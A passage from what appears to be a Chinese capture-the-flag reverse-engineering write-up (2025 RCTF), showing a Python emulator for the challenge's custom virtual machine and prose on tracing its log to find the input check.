</span></span><span class=line><span class=cl>            <span class=n>dst</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>src</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span> <span class=o>&gt;=</span> <span class=mi>8</span> <span class=ow>or</span> <span class=n>src</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x2C&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>src</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>addr</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base1</span> <span class=o>+</span> <span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=n>u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>dst</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u8</span><span class=p>(</span><span class=n>addr</span><span class=p>,</span> <span class=n>val</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;STB [base1 + (u16)R</span><span class=si>{</span><span class=n>src</span><span class=si>}</span><span class=s2>] @0x</span><span class=si>{</span><span class=n>addr</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> = R</span><span class=si>{</span><span class=n>dst</span><span class=si>}</span><span class=s2>.lo (0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x32: ZF = (R[reg] == imm64)</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x32</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x32&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>b</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=p>:</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=p>]</span> <span class=o>+</span>
</span></span><span class=line><span class=cl>                      <span class=bp>self</span><span class=o>.</span><span class=n>mem</span><span class=p>[:</span><span class=nb>max</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=o>+</span><span class=mi>8</span><span class=o>-</span><span class=n>MEM_SIZE</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>            <span class=n>imm</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack_from</span><span class=p>(</span><span class=s2>&#34;&lt;Q&#34;</span><span class=p>,</span> <span class=n>b</span><span class=p>,</span> <span class=mi>0</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>zf</span> <span class=o>=</span> <span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>==</span> <span class=n>imm</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;CMP R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> == 0x</span><span class=si>{</span><span class=n>imm</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>? R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2>=0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, ZF=</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>zf</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># if reg == 0:</span>
</span></span><span class=line><span class=cl>            <span class=c1>#     self.zf = True</span>
</span></span><span class=line><span class=cl>            <span class=c1>#     self.debug_ok = False</span>
</span></span><span class=line><span class=cl>            <span class=c1>#     self.num += 1</span>
</span></span><span class=line><span class=cl>        <span class=c1># 0x80: 把当前 ip 记到 base2，作为“函数起点”</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x80</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>base2</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SET base2 = ip = 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x81: 注册函数：table[idx] = base2 + 3</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x81</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=nb>hasattr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=s2>&#34;fun_table&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span> <span class=o>=</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>base2</span> <span class=o>+</span> <span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;DEF FN[</span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s2>] = 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x82: call 函数：压栈返回地址，再跳转</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x82</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>idx</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=nb>hasattr</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=s2>&#34;fun_table&#34;</span><span class=p>)</span> <span class=ow>or</span> <span class=n>idx</span> <span class=ow>not</span> <span class=ow>in</span> <span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>KeyError</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;function idx </span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s2> not registered&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>ip</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>-</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=p>,</span> <span class=n>ret</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=p>(</span><span class=n>ret</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mh>0xFF</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fun_table</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;CALL FN[</span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s2>] -&gt; 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>ip</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>, push RET=0x</span><span class=si>{</span><span class=n>ret</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2> at dp=0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x83: ret：从栈顶弹出返回地址到 ip</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x83</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>==</span> <span class=mh>0xFFFF</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>log</span><span class=p>(</span><span class=s2>&#34;RET with empty stack -&gt; halt&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=bp>self</span><span class=o>.</span><span class=n>run_flag</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span>
</span></span><span class=line><span class=cl>            <span class=n>lo</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>hi</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u8</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>ret</span> <span class=o>=</span> <span class=p>(</span><span class=n>hi</span> <span class=o>&lt;&lt;</span> <span class=mi>8</span><span class=p>)</span> <span class=o>|</span> <span class=n>lo</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>+</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;RET to 0x</span><span class=si>{</span><span class=n>ret</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>, new dp=0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>ip</span> <span class=o>=</span> <span class=n>ret</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x84: 输出 R[reg]（写到栈上），然后退出 VM</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x84</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x84&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>-</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>write_u64</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=p>,</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>output</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;RETVAL R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> = 0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2> stored at dp=0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>, HALT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># self.run_flag = False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x85: R[reg] = QWORD[mem[dp]] ; dp += 8</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x85</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>reg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>reg</span> <span class=o>&gt;=</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>raise</span> <span class=ne>IndexError</span><span class=p>(</span><span class=s2>&#34;reg out of range in 0x85&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>val</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>read_u64</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>regs</span><span class=p>[</span><span class=n>reg</span><span class=p>]</span> <span class=o>=</span> <span class=n>val</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>=</span> <span class=n>u16</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span> <span class=o>+</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;POPQ R</span><span class=si>{</span><span class=n>reg</span><span class=si>}</span><span class=s2> = [dp] =&gt; 0x</span><span class=si>{</span><span class=n>val</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>, new dp=0x</span><span class=si>{</span><span class=bp>self</span><span class=o>.</span><span class=n>dp</span><span class=si>:</span><span class=s2>04x</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 0x90: 系统调用（这里还没实现）</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>opcode</span> <span class=o>==</span> <span class=mh>0x90</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>arg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>fetch_u8</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;SYSCALL 0x90 arg=0x</span><span class=si>{</span><span class=n>arg</span><span class=si>:</span><span class=s2>02x</span><span class=si>}</span><span class=s2> (NOT IMPLEMENTED) -&gt; HALT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># self.run_flag = False</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>log</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;UNKNOWN opcode -&gt; HALT&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>run_flag</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>steps</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=bp>self</span><span class=o>.</span><span class=n>run_flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>step</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=n>debug</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>steps</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>self</span><span class=o>.</span><span class=n>output</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run_vm_with_ints</span><span class=p>(</span><span class=n>ints</span><span class=p>,</span> <span class=n>vmcode_path</span><span class=o>=</span><span class=s2>&#34;full_vmcode&#34;</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>vmcode_path</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>code</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>vm</span> <span class=o>=</span> <span class=n>VM</span><span class=p>(</span><span class=n>code</span><span class=p>,</span> <span class=n>input_ints</span><span class=o>=</span><span class=n>ints</span><span class=p>,</span> <span class=n>debug_after_n</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>vm</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>debug</span><span class=o>=</span><span class=n>debug</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>out</span><span class=p>,</span> <span class=n>vm</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>ints</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1633771873</span><span class=p>,</span> <span class=mi>13767982679358783948</span><span class=p>,</span> <span class=mi>11713643540287541804</span><span class=p>,</span> <span class=mi>1684300900</span><span class=p>,</span> <span class=mi>1701143909</span><span class=p>,</span> <span class=mi>1717986918</span><span class=p>,</span> <span class=mi>1734829927</span><span class=p>,</span> <span class=mi>1751672936</span><span class=p>,</span> <span class=mi>14773488025708418042</span><span class=p>,</span> <span class=mi>1785358954</span><span class=p>,</span> <span class=mi>1802201963</span><span class=p>,</span> <span class=mi>1819044972</span><span class=p>,</span> <span class=mi>1835887981</span><span class=p>,</span> <span class=mi>1852730990</span><span class=p>,</span> <span class=mi>1869573999</span><span class=p>,</span> <span class=mi>1886417008</span><span class=p>,</span> <span class=mi>1903260017</span><span class=p>,</span> <span class=mi>3919366872831373201</span><span class=p>,</span> <span class=mi>11451939409513851430</span><span class=p>,</span> <span class=mi>1953789044</span><span class=p>,</span> <span class=mi>17235855896972825888</span><span class=p>,</span> <span class=mi>1987475062</span><span class=p>,</span> <span class=mi>2004318071</span><span class=p>,</span> <span class=mi>2021161080</span><span class=p>,</span> <span class=mi>2038004089</span><span class=p>,</span> <span class=mi>2054847098</span><span class=p>,</span> <span class=mi>1094795585</span><span class=p>,</span> <span class=mi>1111638594</span><span class=p>,</span> <span class=mi>1128481603</span><span class=p>,</span> <span class=mi>5295387722887053174</span><span class=p>,</span> <span class=mi>15356410353063384153</span><span class=p>,</span> <span class=mi>12187465423418120720</span><span class=p>,</span> <span class=mi>1195853639</span><span class=p>,</span> <span class=mi>1212696648</span><span class=p>,</span> <span class=mi>1229539657</span><span class=p>,</span> <span class=mi>1246382666</span><span class=p>,</span> <span class=mi>1263225675</span><span class=p>,</span> <span class=mi>1280068684</span><span class=p>,</span> <span class=mi>1296911693</span><span class=p>,</span> <span class=mi>1313754702</span><span class=p>,</span> <span class=mi>1330597711</span><span class=p>,</span> <span class=mi>1347440720</span><span class=p>,</span> <span class=mi>1364283729</span><span class=p>,</span> <span class=mi>1381126738</span><span class=p>,</span> <span class=mi>1397969747</span><span class=p>,</span> <span class=mi>1414812756</span><span class=p>,</span> <span class=mi>1431655765</span><span class=p>,</span> <span class=mi>1448498774</span><span class=p>,</span> <span class=mi>11625777768394830813</span><span class=p>,</span> <span class=mi>1482184792</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>ints</span> <span class=o>=</span> <span class=mi>1633771873</span><span class=p>,</span><span class=mi>1650614882</span><span class=p>,</span><span class=mi>1667457891</span><span class=p>,</span><span class=mi>1684300900</span><span class=p>,</span><span class=mi>1701143909</span><span class=p>,</span><span class=mi>1717986918</span><span class=p>,</span><span class=mi>1734829927</span><span class=p>,</span><span class=mi>1751672936</span><span class=p>,</span><span class=mi>1768515945</span><span class=p>,</span><span class=mi>1785358954</span><span class=p>,</span><span class=mi>1802201963</span><span class=p>,</span><span class=mi>1819044972</span><span class=p>,</span><span class=mi>1835887981</span><span class=p>,</span><span class=mi>1852730990</span><span class=p>,</span><span class=mi>1869573999</span><span class=p>,</span><span class=mi>1886417008</span><span class=p>,</span><span class=mi>1903260017</span><span class=p>,</span><span class=mi>1920103026</span><span class=p>,</span><span class=mi>1936946035</span><span class=p>,</span><span class=mi>1953789044</span><span class=p>,</span><span class=mi>1970632053</span><span class=p>,</span><span class=mi>1987475062</span><span class=p>,</span><span class=mi>2004318071</span><span class=p>,</span><span class=mi>2021161080</span><span class=p>,</span><span class=mi>2038004089</span><span class=p>,</span><span class=mi>2054847098</span><span class=p>,</span><span class=mi>1094795585</span><span class=p>,</span><span class=mi>1111638594</span><span class=p>,</span><span class=mi>1128481603</span><span class=p>,</span><span class=mi>1145324612</span><span class=p>,</span><span class=mi>1162167621</span><span class=p>,</span><span class=mi>1179010630</span><span class=p>,</span><span class=mi>1195853639</span><span class=p>,</span><span class=mi>1212696648</span><span class=p>,</span><span class=mi>1229539657</span><span class=p>,</span><span class=mi>1246382666</span><span class=p>,</span><span class=mi>1263225675</span><span class=p>,</span><span class=mi>1280068684</span><span class=p>,</span><span class=mi>1296911693</span><span class=p>,</span><span class=mi>1313754702</span><span class=p>,</span><span class=mi>1330597711</span><span class=p>,</span><span class=mi>1347440720</span><span class=p>,</span><span class=mi>1364283729</span><span class=p>,</span><span class=mi>1381126738</span><span class=p>,</span><span class=mi>1397969747</span><span class=p>,</span><span class=mi>1414812756</span><span class=p>,</span><span class=mi>1431655765</span><span class=p>,</span><span class=mi>1448498774</span><span class=p>,</span><span class=mi>1465341783</span><span class=p>,</span><span class=mi>1482184792</span><span class=p>,</span><span class=mi>1499027801</span><span class=p>,</span><span class=mi>1515870810</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span><span class=p>,</span> <span class=n>vm</span> <span class=o>=</span> <span class=n>run_vm_with_ints</span><span class=p>(</span><span class=n>ints</span><span class=p>,</span> <span class=n>vmcode_path</span><span class=o>=</span><span class=s2>&#34;full_vmcode&#34;</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>out</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;VM finished without explicit 0x84 output&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;VM output: </span><span class=si>{</span><span class=n>out</span><span class=si>}</span><span class=s2> (0x</span><span class=si>{</span><span class=n>out</span><span class=si>:</span><span class=s2>016x</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>上面可以完整的打印所有流程，输入ints我最开始构造的是aaaa、bbbb等ascii_letters[:50]，最开始可以把log注释全部取消，debug参数改为True可以看到完整流程</p><p>观察到第一组数据读出了0x63636363，也就是第三个数，然后会运行到opcode为0x90的地方，可以发现打印Fail前面正好有一处cmp比较了数值，测试发现第一个数是固定的，第二个是我们输入的数字经过加密得到的</p><p><img src=/img/2025-RCTF/75.png alt=img></p><p><img src=/img/2025-RCTF/76.png alt=img></p><p>我们可以简化下代码，实际上可以只看<strong>数字读取开始</strong>到<strong>cmp比较</strong>中间的运算代码，jmp类log、数据读取类均可以注释掉，方便我们分析运算代码（具体修改是把debug改为False、opcode 0x18那里增加reg==0时候设置debug_ok开始打印日志），此时一轮check日志可以缩减为2000行左右了，可以把一轮的日志喂给各种ai让他们各显神通</p><p>最后抽象整理出了几个函数，在之后的几轮check发现都用到了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
